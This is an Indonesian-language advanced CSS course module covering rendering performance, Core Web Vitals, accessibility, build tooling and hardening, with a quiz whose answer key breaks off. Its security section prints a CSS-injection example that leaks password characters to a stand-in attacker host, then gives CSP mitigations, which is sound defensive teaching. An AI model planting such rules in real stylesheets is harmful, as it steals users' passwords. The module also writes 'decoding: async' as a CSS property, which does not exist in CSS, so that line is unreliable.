# Bab 09 Module 01: Enterprise Performance Optimization, Accessibility, & Tooling

---

## SEKSI 01 — IDENTITAS MODUL

*   **Jalur Kurikulum:** 03-Frontend-and-Mobile
*   **Topik Spesialisasi:** Cascading Style Sheets (CSS)
*   **Nomor Modul:** Bab 09 Module 01
*   **Judul Modul:** Enterprise Performance Optimization, Accessibility, & Tooling
*   **Tingkat Kompleksitas:** Advanced / Staff Engineer Level
*   **Prasyarat:** Penguasaan CSS Layouting (Flexbox, CSS Grid), CSS Custom Properties, Browser Rendering Pipeline dasar, serta pemahaman alur kerja modern frontend bundler (Vite, Webpack, PostCSS).

---

## SEKSI 02 — LEARNING OBJECTIVES

Setelah menyelesaikan modul ini, peserta mampu:

1.  **Mendiagnosis dan Mengeliminasi Bottleneck Rendering:** Mengidentifikasi dan mereduksi dampak *render-blocking CSS*, *forced synchronous layouts* (layout thrashing), serta sub-optimal paint cycles pada browser engine (Blink, Gecko, WebKit).
2.  **Mengoptimalkan Core Web Vitals Skala Enterprise:** Mengimplementasikan strategi penulisan CSS dan arsitektur pengiriman aset untuk meminimalkan *Largest Contentful Paint* (LCP), menihilkan *Cumulative Layout Shift* (CLS), dan mempercepat *Interaction to Next Paint* (INP).
3.  **Menerapkan Sistem Aksesibilitas Terintegrasi:** Mengembangkan stylesheet adaptif yang patuh pada standar WCAG 2.2 Level AA/AAA menggunakan CSS primitives, media queries aksesibilitas terkini, dan manajemen fokus visual tanpa merusak pohon aksesibilitas (Accessibility Tree).
4.  **Membangun Pipeline Tooling Modern:** Merancang konfigurasi otomasi CSS skala produksi menggunakan Lightning CSS, PostCSS, PurgeCSS/Tailwind JIT engine, serta integrasi Static Analysis Stylelint untuk menjamin higiene kode pada repositori monorepo skala besar.

---

## SEKSI 03 — MINDSET & MENTAL MODEL

### Mental Model 1: Pipeline Eksekusi Browser sebagai Jalur Manufaktur Fisik
Pikirkan rendering engine peramban seperti perakitan konveyor pabrik:
*   **Parse HTML/CSS $\to$ DOM & CSSOM Tree:** Penerimaan material mentah. Setiap byte CSS yang lambat diunduh menghentikan seluruh jalur perakitan (*render-blocking*).
*   **Render Tree & Layout (Reflow):** Pengukuran dimensi geometris dan penempatan spasial. Mengubah properti seperti `width`, `height`, `margin`, atau `top` memaksa pabrik mengukur ulang seluruh jalur dari awal.
*   **Paint & Composite:** Pewarnaan piksel dan pengiriman lapisan (*layers*) ke GPU. Mengubah `transform` atau `opacity` hanya memanipulasi lapisan yang sudah ada tanpa membongkar ulang struktur fisik (geometri).

### Mental Model 2: Kontrak Inklusivitas Aksesibilitas
Aksesibilitas (a11y) dalam CSS bukan sekadar lapisan kosmetik pasca-rilis; ini adalah kontrak struktural antara agen pengguna (*user agent*) dan pengguna. UI yang dirancang tanpa pertimbangan gerak (*motion sensitivity*), kontras adaptif, atau penanda fokus papan ketik yang jelas dianggap cacat fungsi setara dengan *bug crash* pada backend logika.

---

## SEKSI 04 — ARSITEKTUR & DIAGRAM ALUR

### Siklus Kritis Parsing Engine dan Jalur Render Browser

```
[ Jaringan: File .HTML ]
         |
         v
   +------------+
   | Tokenizer  |
   +------------+
         |
         v
   +------------+         [ Jaringan: File .CSS ]
   |  DOM Tree  |                    |
   +------------+                    v
         |                    +------------+
         |                    | Tokenizer  |
         |                    +------------+
         |                          |
         |                          v
         |                   +------------+
         |                   | CSSOM Tree |
         |                   +------------+
         \                         /
          \                       /
           v                     v
      +-------------------------------+
      |          Render Tree          |  <-- Node terlihat (DOM + CSSOM)
      +-------------------------------+
                      |
                      v
      +-------------------------------+
      | Layout (Reflow)               |  <-- Hitung Geometri: X, Y, Width, Height
      | *CPU Heavy*                   |      Dipicu: width, margin, display, font-size
      +-------------------------------+
                      |
                      v
      +-------------------------------+
      | Paint (Rasterization)         |  <-- Isi Piksel: Warna, Bayangan, Border
      | *CPU to GPU Conversion*       |      Dipicu: color, background, box-shadow
      +-------------------------------+
                      |
                      v
      +-------------------------------+
      | Compositing                   |  <-- GPU Layer Blending
      | *GPU Native, Super Fast*      |      Dipicu: transform, opacity, will-change
      +-------------------------------+
                      |
                      v
            [ Layar Monitor Pengguna ]
```

---

## SEKSI 05 — ANATOMI & MEKANISME INTERNAL

### 1. CSSOM (CSS Object Model) dan Sifat Pemblokiran (Render-Blocking)
Ketika parser HTML menemukan tag `<link rel="stylesheet">`, parser HTML dapat melanjutkan konstruksi DOM kecuali jika skrip sinkronus ditemukan. Namun, **browser tidak akan me-render apa pun** ke layar hingga CSSOM selesai dibangun seutuhnya. Hal ini terjadi karena browser menghindari *Flash of Unstyled Content* (FOUC).

```
Spesifisitas + Sumber (User Agent / Author) -> Eksekusi Cascading -> Eksekusi Computed Values -> CSSOM
```

### 2. Geometri Layering dan GPU Promotion
Browser modern memecah halaman menjadi lapisan-lapisan (*compositing layers*). Elemen-elemen yang dipromosikan ke lapisan terpisah diproses secara paralel oleh GPU:
*   Pemicu promosi lapisan: `will-change: transform`, `transform: translateZ(0)`, elemen `<video>`, `<canvas>`, atau animasi CSS aktif pada properti transformasi.
*   **Bahaya Memori (Layer Squashing & Explosion):** Promosi yang berlebihan memakan alokasi VRAM secara masif. Setiap layer berukuran lebar $\times$ tinggi $\times$ 4 byte (RGBA). Jika halaman berukuran $1920 \times 1080$, satu layer membutuhkan sekitar 8.3 MB memori GPU mentah.

### 3. Tree Aksesibilitas (A11y Tree) vs. Display Property
*   `display: none;` menghapus elemen dari **Render Tree** sekaligus dari **Accessibility Tree**. Pembaca layar (screen reader) mengabaikannya secara mutlak.
*   `visibility: hidden;` mempertahankan geometri dalam alokasi layout, tetapi menghilangkannya dari layer interaksi dan Accessibility Tree.
*   `opacity: 0;` mempertahankan elemen di dalam DOM, Render Tree, dan **Accessibility Tree**. Pembaca layar tetap membacanya, dan elemen masih menerima klik kecuali dinonaktifkan via `pointer-events: none;`.

---

## SEKSI 06 — DEEP DIVE KONSEP & TEORI TEKNIS

### Core Web Vitals (CWV) & Korelasinya dengan CSS

#### Largest Contentful Paint (LCP)
LCP mengukur waktu render elemen konten terbesar yang terlihat di viewport. 
*   **CSS Impact:** Jika gambar LCP bergantung pada kelas CSS (`background-image: url(...)`), browser menemukan URL tersebut sangat lambat dibanding tag `<img>` native karena harus menunggu CSS diunduh, di-parse, dan dicocokkan dengan selector DOM.
*   **Mitigasi:** Hindari memuat hero image melalui CSS. Jika terpaksa, manfaatkan *preloading* relasional adaptif.

#### Cumulative Layout Shift (CLS)
CLS mengukur instabilitas visual tak terduga.
*   **CSS Impact:**
    1.  Web Font swap (`font-display: swap`) yang memiliki metrik font fallback berbeda menyebabkan teks berubah dimensi (*FOYT/FOUT*).
    2.  Konten asinkron atau gambar tanpa deklarasi rasio aspek (`aspect-ratio`).
*   **Mitigasi:** Implementasi properti `aspect-ratio: 16 / 9;` dan CSS `@font-face` metric overriding (`size-adjust`, `ascent-override`, `descent-override`).

#### Interaction to Next Paint (INP)
INP merefleksikan latensi responsivitas interaksi pengguna.
*   **CSS Impact:** Selektor CSS yang terlampau kompleks (misal: `div.container > ul li:nth-child(2n+1) a[href*="domain"] span`) memperlambat fase *Recalculate Style* saat JavaScript memanipulasi kelas atau atribut DOM secara intensif.

### Media Queries Aksesibilitas Modern
1.  `prefers-reduced-motion`: Mendeteksi preferensi pengguna yang memiliki gangguan vestibular agar tidak mengalami disorientasi akibat animasi berlebih.
2.  `prefers-contrast`: Mengatur level kontras warna adaptif bagi individu dengan defisiensi penglihatan.
3.  `forced-colors`: Mengidentifikasi apakah pengguna mengaktifkan mode kontras tinggi level sistem operasi (seperti *Windows High Contrast Mode*), di mana palet warna dipaksa oleh sistem.

---

## SEKSI 07 — CONTOH KODE FUNDAMENTAL

Berikut adalah implementasi modern CSS modular yang menerapkan prinsip arsitektur *hardware acceleration*, *layout stability*, dan aksesibilitas adaptif.

```css
/* ==========================================================================
   1. FONT METRIC OVERRIDE (Pencegahan CLS Saat Webfont Swap)
   ========================================================================== */
@font-face {
  font-family: 'Inter-Fallback';
  src: local('Arial');
  ascent-override: 90.49%;
  descent-override: 22.56%;
  line-gap-override: 0%;
  size-adjust: 107.4%;
}

:root {
  --font-primary: 'Inter', 'Inter-Fallback', -apple-system, sans-serif;
  --focus-ring-color: #2563eb;
  --text-base-color: #0f172a;
  --surface-color: #ffffff;
}

/* ==========================================================================
   2. SURFACE STYLING & ACCESSIBLE COLOR ADAPTATION
   ========================================================================== */
@media (forced-colors: active) {
  :root {
    --focus-ring-color: Highlight;
    --text-base-color: CanvasText;
    --surface-color: Canvas;
  }
}

body {
  font-family: var(--font-primary);
  color: var(--text-base-color);
  background-color: var(--surface-color);
  margin: 0;
  text-rendering: optimizeLegibility;
  -webkit-font-smoothing: antialiased;
}

/* ==========================================================================
   3. HIGH-PERFORMANCE ANIMATED COMPONENT (Zero Layout Reflow)
   ========================================================================== */
.card-interactive {
  position: relative;
  contain: layout style paint;
  will-change: transform;
  transition: transform 250ms cubic-bezier(0.16, 1, 0.3, 1), 
              box-shadow 250ms cubic-bezier(0.16, 1, 0.3, 1);
  aspect-ratio: 16 / 9;
  border-radius: 8px;
  overflow: hidden;
  background-color: var(--surface-color);
}

.card-interactive:hover {
  /* Hanya memicu Compositor Layer tanpa memicu Reflow/Layout */
  transform: translateY(-4px) scale(1.01);
  box-shadow: 0 12px 24px -10px rgba(0, 0, 0, 0.15);
}

/* Penanganan vestibular disorder */
@media (prefers-reduced-motion: reduce) {
  .card-interactive {
    transition: none;
    will-change: auto;
  }
  .card-interactive:hover {
    transform: none;
    box-shadow: 0 0 0 2px var(--focus-ring-color);
  }
}

/* ==========================================================================
   4. ACCESSIBLE FOCUS MANAGEMENT
   ========================================================================== */
.button-action {
  appearance: none;
  border: 1px solid transparent;
  padding: 0.75rem 1.5rem;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  background-color: var(--focus-ring-color);
  color: #ffffff;
  border-radius: 6px;
}

/* Tampilkan fokus ring HANYA saat navigasi keyboard */
.button-action:focus {
  outline: none;
}

.button-action:focus-visible {
  outline: 3px solid var(--focus-ring-color);
  outline-offset: 3px;
}
```

---

## SEKSI 08 — ANALISIS BARIS DEMI BARIS

*   **Baris 4–11 (`@font-face` fallback overrides):** Mendefinisikan font fallback lokal (`Arial`) yang disesuaikan secara geometris (`size-adjust`, `ascent-override`, `descent-override`) untuk menyamai metrik font `Inter`. Ketika `Inter` selesai diunduh dan menggantikan `Arial`, tidak terjadi pergeseran tinggi baris teks (CLS = 0).
*   **Baris 20–27 (`@media (forced-colors: active)`):** Mendeteksi Windows High Contrast Mode. Mengganti variabel warna kustom dengan *system color keywords* standar (`Canvas`, `CanvasText`, `Highlight`) untuk mempertahankan keterbacaan ekstrem tanpa merusak visual sistem operasi.
*   **Baris 38 (`contain: layout style paint;`):** Menerapkan isolasi CSS containment. Browser mengetahui bahwa sub-pohon DOM di dalam `.card-interactive` tidak memengaruhi layout elemen di luar batas kontainer ini, mengisolasi komputasi reflow saat manipulasi DOM internal terjadi.
*   **Baris 39 (`will-change: transform;`):** Memberikan sinyal awal kepada browser untuk mempromosikan elemen ini ke lapisan komposisi (compositing layer/GPU) sendiri sebelum animasi berjalan.
*   **Baris 42 (`aspect-ratio: 16 / 9;`):** Mengalokasikan ruang proporsional sebelum gambar atau data asinkron di dalamnya dimuat, secara instan meniadakan layout shifting.
*   **Baris 48 (`transform: translateY(-4px)...`):** Perubahan visual yang dijalankan murni pada GPU Compositor Thread, melewati tahap *Layout* dan *Paint* secara komplit (60–120 FPS terjamin).
*   **Baris 52–60 (`@media (prefers-reduced-motion: reduce)`):** Mematikan transisi transform dan memanfaatkan indikator statis non-motion untuk pengguna yang sensitif terhadap gerakan.
*   **Baris 78–81 (`:focus-visible`):** Standar modern penanganan fokus. Menghilangkan *focus ring* yang mengganggu saat diklik mouse, namun memunculkan cincin kontras tinggi dengan `outline-offset` saat dinavigasi via tombol `Tab` keyboard.

---

## SEKSI 09 — STUDI KASUS NYATA

### Skenario: Krisis LCP dan Skoring Aksesibilitas Rendah pada Portal Global E-Commerce
*   **Konteks Perusahaan:** Platform retail berskala internasional dengan 50 juta *monthly active users* (MAU).
*   **Masalah Ditemukan:**
    1.  Skor *Core Web Vitals* pada perangkat mobile berada di zona merah: LCP = 5.2s, CLS = 0.38, INP = 420ms.
    2.  Pemeriksaan audit mendapati gugatan kepatuhan hukum terkait pelanggaran ADA/WCAG 2.2 Title III karena navigasi keyboard gagal total pada katalog produk.
    3.  Aset CSS monolithic sebesar 850 KB diunduh secara *render-blocking* di `<head>`.
*   **Akar Masalah Teknis:**
    *   File CSS raksasa memuat selektor tidak terpakai (92% unused CSS) dari dependensi lawas.
    *   Katalog produk merender 100+ item sekaligus menggunakan flexbox dinamis tanpa atribut dimensi gambar atau *content-visibility*, menyebabkan lonjakan alokasi CPU saat *Initial Layout*.
    *   Penggunaan selektor universal berantai seperti `* { transition: all 0.3s ease; }` memicu kalkulasi *style invalidation* global setiap kali terjadi interaksi hover atau klik.

---

## SEKSI 10 — IMPLEMENTASI KASUS NYATA

Arsitektur Solusi Terintegrasi Skala Enterprise:
1.  **Pipeline Tooling:** Setup integrasi bundler menggunakan konfigurasi PostCSS + Lightning CSS.
2.  **Optimasi Virtual Dom/Rendering via CSS Primitives:** Implementasi `content-visibility: auto;` untuk *off-screen content deferral*.
3.  **High-Performance Focus Ring Architecture.**

### 1. Konfigurasi Lightning CSS & PostCSS Pipeline

```javascript
// postcss.config.js
module.exports = {
  plugins: [
    require('postcss-preset-env')({
      stage: 2,
      features: {
        'nesting-rules': true,
        'custom-properties': false // Dikelola native untuk performa runtime
      }
    }),
    require('cssnano')({
      preset: ['advanced', {
        discardComments: { removeAll: true },
        reduceIdents: true,
        zindex: false // Mencegah mutasi z-index tak terduga dalam hierarki aplikasi besar
      }]
    })
  ]
};
```

### 2. Implementasi CSS Produksi Solusi Katalog

```css
/* styles/product-grid.css */

/* Isolasi komputasi layout rendering offscreen */
.product-grid-stream {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 1.5rem;
  padding: 1.5rem;
  margin: 0 auto;
  max-width: 1440px;
}

.product-card {
  /* CONTENT-VISIBILITY: Melewatkan rendering layout & paint jika berada di luar viewport */
  content-visibility: auto;
  /* contain-intrinsic-size: Nilai estimasi geometri saat elemen berada di luar viewport */
  contain-intrinsic-size: 280px 420px;
  
  display: flex;
  flex-direction: column;
  border: 1px solid #e2e8f0;
  border-radius: 8px;
  background: #ffffff;
  position: relative;
}

.product-image-wrapper {
  position: relative;
  width: 100%;
  aspect-ratio: 1 / 1;
  background-color: #f1f5f9; /* Skeleton placeholder warna native */
  overflow: hidden;
}

.product-image {
  width: 100%;
  height: 100%;
  object-fit: cover;
  /* Hindari decoding gambar pada main UI thread */
  decoding: async;
}

/* Accessible Hit Area Expansion (Prinsip Target Size WCAG 2.2 - min 24x24 px) */
.product-action-link {
  color: #0f172a;
  text-decoration: none;
  font-weight: 700;
  font-size: 1.125rem;
  line-height: 1.4;
}

/* Memperluas area klik secara inklusif tanpa mengubah struktur visual */
.product-action-link::after {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  z-index: 1;
}

/* Elemen interaktif sekunder diangkat z-index-nya agar tetap fungsional */
.product-bookmark-button {
  position: relative;
  z-index: 2;
  min-width: 44px; /* Standar AAA / Mobile friendly */
  min-height: 44px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  background: transparent;
  border: none;
  cursor: pointer;
}

.product-bookmark-button:focus-visible {
  outline: 2px solid #2563eb;
  outline-offset: -2px;
  border-radius: 4px;
}
```

---

## SEKSI 11 — TRADE-OFFS & ANALISIS PERBANDINGAN KOMPARATIF

| Fitur / Pendekatan | Keuntungan Utama | Kerugian / Risiko | Kompleksitas Teknis | Kasus Penggunaan Optimal |
| :--- | :--- | :--- | :--- | :--- |
| `content-visibility: auto` | Mengurangi waktu *Initial Scripting & Rendering* hingga 70-80% pada DOM besar. | *Scrollbar jumping* jika `contain-intrinsic-size` tidak diestimasi dengan akurat. | Rendah - Menengah | Halaman *Infinite Scroll*, e-commerce, feed sosial, dokumentasi panjang. |
| `will-change: transform` | Animasi instan berbasis GPU, frame rate stabil (120 FPS). | Konsumsi VRAM melonjak drastis (*Layer Explosion*). Baterai boros pada mobile. | Menengah | Hanya diterapkan saat elemen akan/sedang beranimasi aktif. |
| Inlining Critical CSS | Menghilangkan *render-blocking network requests*, mempercepat FCP/LCP. | Menghilangkan kapabilitas cache HTTP browser untuk CSS yang sama di rute berikutnya. | Tinggi (Butuh pipeline build kompleks) | Landing page statis, SEO critical entry points. |
| CSS Utility-First (e.g., Tailwind) | Ukuran bundel CSS rata/tetap konstan seiring bertambahnya fitur, *zero dead-code*. | Keterbacaan markup HTML terdegradasi, kurva belajar konfigurasi tooling. | Rendah | Aplikasi web enterprise monorepo skala masif. |

---

## SEKSI 12 — EDGE CASES & PITFALLS

### 1. Scrollbar Jumping Akibat Salah Nilai `contain-intrinsic-size`
*   **Gejala:** Pengguna menggulir halaman, tetapi scrollbar tiba-tiba meloncat ke atas/bawah secara liar.
*   **Penyebab:** Ketika elemen yang diberi `content-visibility: auto` masuk ke viewport, browser mengganti nilai estimasi `contain-intrinsic-size` dengan dimensi komputasi riil. Jika perbedaan piksel signifikan (misal: estimasi 200px, riil 600px), panjang halaman bertambah drastis di tengah interaksi.
*   **Mitigasi:** Gunakan `contain-intrinsic-size: auto 350px` yang secara otomatis mengingat ukuran rendering aktual elemen yang pernah terlihat sebelumnya di memori runtime sesi berjalan.

### 2. Focus Trap dan Konten Non-Visual Terbaca Screen Reader
*   **Gejala:** Tombol di dalam modal tersembunyi tetap terbaca oleh pengguna keyboard/screen reader, atau urutan pembacaan melompat tak teratur.
*   **Penyebab:** Menyembunyikan elemen menggunakan `opacity: 0` atau `transform: translateX(-9999px)` alih-alih `display: none` atau `visibility: hidden`.
*   **Mitigasi:** Gunakan atribut modern HTML `inert` dikombinasikan dengan CSS:
    ```css
    [inert] {
      opacity: 0.5;
      pointer-events: none;
      user-select: none;
    }
    ```

---

## SEKSI 13 — COMMON MISTAKES & CARA MENGHINDARINYA

### Kesalahan Fatal 1: Menganimasikan Properti Geometri
```css
/* SALAH: Memicu Reflow dan Repaint pada SELURUH halaman di setiap frame */
.drawer-menu {
  transition: left 0.3s ease;
  left: -300px;
}
.drawer-menu.open {
  left: 0;
}

/* BENAR: Dijalankan sepenuhnya pada GPU Compositor */
.drawer-menu {
  transition: transform 0.3s cubic-bezier(0, 0, 0.2, 1);
  transform: translateX(-100%);
}
.drawer-menu.open {
  transform: translateX(0);
}
```

### Kesalahan Fatal 2: Menghapus Focus Ring Secara Total
```css
/* ANTI-PATTERN: Pelanggaran Keras WCAG 2.2 Level A */
*:focus {
  outline: none; /* Jangan pernah lakukan ini tanpa fallback visual */
}

/* SOLUSI ENTERPRISE */
:focus:not(:focus-visible) {
  outline: none; /* Hilangkan hanya untuk klik kursor */
}
:focus-visible {
  outline: 2px solid #1d4ed8; /* Wajib kontras minimal 3:1 terhadap background sekitar */
  outline-offset: 2px;
}
```

---

## SEKSI 14 — BEST PRACTICES & KONVENSI INDUSTRI

1.  **Gunakan CSS Variables untuk State Dinamis, Bukan Dynamic Class Injection Ekstrem:** Memanipulasi variabel CSS via JavaScript (`el.style.setProperty('--x', val)`) jauh lebih efisien daripada menambah/menghapus 50 class berbeda karena tidak membatalkan cache struktur style sheet.
2.  **Audit Otomatisasi Terintegrasi pada CI/CD:**
    *   Pasang **Lighthouse CI** dengan *budget assertions* ketat: skor CSS uncompressed maksimal 50 KB, skor Aksesibilitas minimal 98/100.
    *   Terapkan **Stylelint** dengan plugin `stylelint-a11y` dan `@double-great/stylelint-a11y` untuk memblokir kode yang tidak ramah screen reader langsung di tahap Pull Request.
3.  **Terapkan Logical Properties:**
    Hindari `margin-left`, `padding-right`, atau `text-align: left`. Gunakan `margin-inline-start`, `padding-inline-end`, dan `text-align: start` untuk mendukung tata letak *Right-to-Left* (RTL) secara otomatis tanpa deklarasi stylesheet terpisah.

---

## SEKSI 15 — OPTIMASI KINERJA & EFISIENSI MEMORI/JARINGAN

### 1. Eliminasi Dead Code dengan Lightning CSS / PurgeCSS
Gunakan pendekatan tree-shaking CSS level AST (Abstract Syntax Tree):

```bash
# Contoh eksekusi Lightning CSS CLI untuk optimasi maksimum
lightningcss --minify --bundle --targets ">= 0.25%, not dead" input.css -o output.min.css
```

### 2. Strategi Split-Resource HTTP/2 & HTTP/3
Jangan satukan seluruh stylesheet aplikasi ke dalam satu file raksasa `app.css`. Pecah berdasarkan jalur konteks kritis:
*   `critical.css` (< 14 KB): Disematkan inline di dalam `<head>` (memaksimalkan ukuran window TCP slow-start roundtrip pertama).
*   `components.css`: Dimuat secara asinkron menggunakan:
    ```html
    <link rel="preload" href="components.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="components.css"></noscript>
    ```

---

## SEKSI 16 — KEAMANAN & HARDENING

### 1. Eksfiltrasi Data Melalui CSS Injection (CSS Keyloggers)
Penyerang yang berhasil menyuntikkan CSS arbitrary dapat mencuri nilai token sensitif via atribut input:

```css
/* SERANGAN: Mengekstraksi karakter value input password melalui background requests */
input[type="password"][value^="a"] {
  background-image: url("https://attacker.com/leak?char=a");
}
input[type="password"][value^="b"] {
  background-image: url("https://attacker.com/leak?char=b");
}
```

#### Mitigasi Defensif Enterprise:
*   **Content Security Policy (CSP):** Batasi muatan resource CSS dan network ping:
    ```http
    Content-Security-Policy: default-src 'self'; style-src 'self' 'nonce-RANDOM_HEX_VALUE'; img-src 'self' https://trusted-cdn.com;
    ```
*   Terapkan atribut `autocomplete="off"` dan jangan pernah mencerminkan nilai input teks sensitif langsung ke dalam atribut DOM `value` statis.

---

## SEKSI 17 — OBSERVABILITAS, TELEMETRI & DEBUGGING

### 1. Tracing Layout Thrashing via Chrome DevTools Performance Profiler
Langkah sistematis mendeteksi layout thrashing:
1.  Buka panel **Performance** di Chrome DevTools, centang opsi **Screenshots** dan **Web Vitals**.
2.  Mulai rekaman (Record), lakukan interaksi, lalu hentikan rekaman.
3.  Periksa baris interaksi **Main Thread**. Cari blok berwarna merah bertuliskan **Recalculate Style** atau **Layout** yang diikuti peringatan: `Forced reflow is a likely performance bottleneck`.
4.  Cari jejak panggilan JS: Membaca properti layout geometris (`offsetWidth`, `getBoundingClientRect()`) sesaat setelah memanipulasi properti CSS style memicu browser menghentikan eksekusi thread untuk menghitung layout secara paksa.

```javascript
// DEBUGGING LOGGING: Deteksi CLS via PerformanceObserver
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (!entry.hadRecentInput) {
      console.warn(`[CLS DETECTED] Nilai Pergeseran: ${entry.value}`, entry.sources);
    }
  }
});
observer.observe({ type: 'layout-shift', buffered: true });
```

---

## SEKSI 18 — RINGKASAN & CHEAT SHEET

*   **Jalur Kritis:** Animasi HANYA boleh memanipulasi `transform` dan `opacity`. Hindari modifikasi properti layout (`top`, `margin`, `width`, `height`).
*   **Skalabilitas Viewport:** Gunakan `content-visibility: auto` dengan `contain-intrinsic-size` untuk mempercepat pemuatan halaman panjang.
*   **Font Stability:** Cegah CLS akibat webfont swap dengan mengoverride metrik fallback (`ascent-override`, `descent-override`, `size-adjust`).
*   **Aksesibilitas Kontras:** Jangan matikan outline tanpa menyediakan alternatif: gunakan `:focus-visible` dengan offset jelas.
*   **Isolasi DOM:** Manfaatkan properti `contain: layout style paint;` pada komponen mandiri untuk membatasi ruang lingkup rendering reflow browser.

---

## SEKSI 19 — KUIS EVALUASI PEMAHAMAN

### Soal 1
Mengapa menganimasikan properti CSS `height` dari `100px` ke `200px` dianggap sangat buruk bagi performa rendering pada perangkat berdaya komputasi rendah?
*   A. Karena browser terpaksa mendownload ulang CSSOM.
*   B. Karena modifikasi geometri memicu perhitungan ulang tahap Layout (Reflow), Paint, dan Compositing pada elemen tersebut beserta elemen di sekitarnya.
*   C. Karena memori GPU (VRAM) akan mengalami *memory leak* akibat penambahan ukuran piksel.
*   D. Karena hal tersebut secara otomatis memicu pelanggaran kriteria WCAG 2.2 terkait flashing visual.

### Soal 2
Perhatikan potongan kode berikut:
```css
.badge-status {
  opacity: 0;
  pointer-events: none;
}
```
Bagaimana dampak dari deklarasi di atas terhadap pembaca layar (screen reader) pengguna tunanetra?
*   A. Badge status tidak akan dibaca sama sekali oleh screen reader.
*   B. Badge status tetap berada di dalam Accessibility Tree dan akan tetap dibacakan oleh screen reader.
*   C. Screen reader akan mengalami error karena properti `pointer-events: none`.
*   D. Konten badge status otomatis dipindahkan ke atribut `aria-hidden="true"`.

### Soal 3
Bagaimana cara kerja properti `content-visibility: auto` dalam mereduksi waktu initial loading suatu dokumen web panjang?
*   A. Menghapus elemen dari file DOM secara permanen hingga diakses.
*   B. Mengubah seluruh gambar di dalam container menjadi format WebP secara real-time.
*   C. Melewatkan kalkulasi rendering (layout dan painting) untuk elemen-elemen yang berada di luar layar (off-screen) sampai elemen mendekati viewport.
*   D. Menjalankan proses rendering di Web Worker terpisah di luar thread utama browser.

### Soal 4
Tindakan mana yang paling efektif dalam mengeliminasi Layout Shifts (CLS) yang disebabkan oleh banner gambar dinamis?
*   A. Menambahkan `transform: translateZ(0)` pada banner gambar.
*   B. Mengatur `aspect-ratio` atau menyematkan atribut `width` dan `height` eksplisit pada HTML/CSS gambar.
*   C. Menerapkan `will-change: width, height` pada tag gambar.
*   D. Memuat banner gambar secara eksklusif menggunakan JavaScript via Base64 string inline.

### Soal 5
Apa kerentanan performa terbesar dari deklarasi selektor CSS global berikut ini?
```css
* {
  transition: all 0.2s ease-in-out;
}
```
*   A. Memicu kebocoran memori (leak) pada CSSOM parser.
*   B. Mengakibatkan *style recalculation* dan perombakan pipeline rendering yang masif pada setiap node DOM ketika terjadi interaksi pada satu elemen kecil.
*   C. Memblokir parsing HTML hingga seluruh transisi selesai dieksekusi secara sinkronus.
*   D. Menonaktifkan fungsi hardware acceleration pada GPU secara sistemik.

---

### Kunci Jawaban & Analisis Evaluasi
1.  **Jawaban: B.** Mengubah `height` mengubah ukuran fisik elemen. Browser harus menjalankan fase *Layout* untuk menentukan ulang posisi setiap elemen di bawah dan di sampingnya, lalu melakukan *Paint* ulang piksel, barulah melakukan *Compositing*. Ini adalah beban komputasi CPU yang sangat intensif.
2.  **Jawaban: B.** `opacity: 0` dan `pointer-events: none` menyembunyikan elemen secara visual dan memblokir interaksi klik mouse, namun **tidak menghapusnya dari Accessibility Tree**. Screen reader tetap akan menganggap elemen itu ada dan membacakannya. Untuk menghilangkannya dari screen reader, gunakan `display: none` atau `visibility: hidden` atau atribut `aria-hidden="true"`.
3.  **Jawaban: C.** `content-visibility: auto` memanfaatkan kapabilitas browser containment. Jika elemen berada jauh di bawah viewport, browser tidak menghitung layout maupun pewarnaan pikselnya, sehingga waktu eksekusi thread utama (*scripting/rendering*) anjlok signifikan.
4.